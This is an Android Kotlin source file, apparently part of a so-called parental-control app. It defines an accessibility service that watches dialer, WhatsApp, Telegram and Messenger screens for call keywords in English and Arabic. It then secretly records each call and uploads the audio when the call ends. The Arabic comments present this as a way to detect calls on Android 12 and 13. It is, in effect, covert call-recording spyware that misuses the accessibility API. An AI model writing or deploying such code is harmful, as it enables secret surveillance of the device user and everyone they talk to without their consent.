package com.example.parentalcontrol

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * خدمة إمكانية الوصول (Accessibility Service)
 * الميزة الأقوى: كشف المكالمات النشطة في أندرويد 12 و13
 */
class AppAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var isCallActive = false
    private lateinit var audioRecorder: AudioRecorderEngine

    override fun onCreate() {
        super.onCreate()
        audioRecorder = AudioRecorderEngine(this)
        Log.i(TAG, "Accessibility Service created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
        val monitoredPackages = listOf(
            "com.google.android.dialer", 
            "com.android.server.telecom", 
            "com.android.phone",
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.orca" // Messenger
        )
        
        if (monitoredPackages.contains(packageName)) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val text = event.text.toString() + " " + (event.contentDescription ?: "")
                    
                    // كشف بداية المكالمة (صوتية أو فيديو)
                    if (isCallUI(text) && !isCallActive) {
                        startCallRecording(packageName)
                    } 
                    // كشف نهاية المكالمة
                    else if (isEndCallUI(text) && isCallActive) {
                        stopCallRecording()
                    }
                }
            }
        }
    }

    private fun isCallUI(text: String): Boolean {
        val keywords = listOf(
            "Incoming", "Ongoing", "Call", "WhatsApp Call", "In call",
            "اتصال", "جاري", "مكالمة", "وقت المكالمة", "نشط"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun isEndCallUI(text: String): Boolean {
        val keywords = listOf(
            "Ended", "Finished", "Call ended", "Missed", "Declined",
            "انتهت", "مكالمة فائتة", "تم إنهاء", "رفض", "تم القطع"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun startCallRecording(app: String) {
        Log.i(TAG, "Call detected in $app! Starting recording...")
        isCallActive = true
        // نمرر اسم التطبيق للتوضيح في اسم الملف مستقبلاً
        audioRecorder.startRecording()
    }

    private fun stopCallRecording() {
        Log.i(TAG, "Call ended. Saving and uploading...")
        isCallActive = false
        audioRecorder.stopRecording(upload = true)
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted")
    }

    companion object {
        private const val TAG = "AppAccessibility"
    }
}
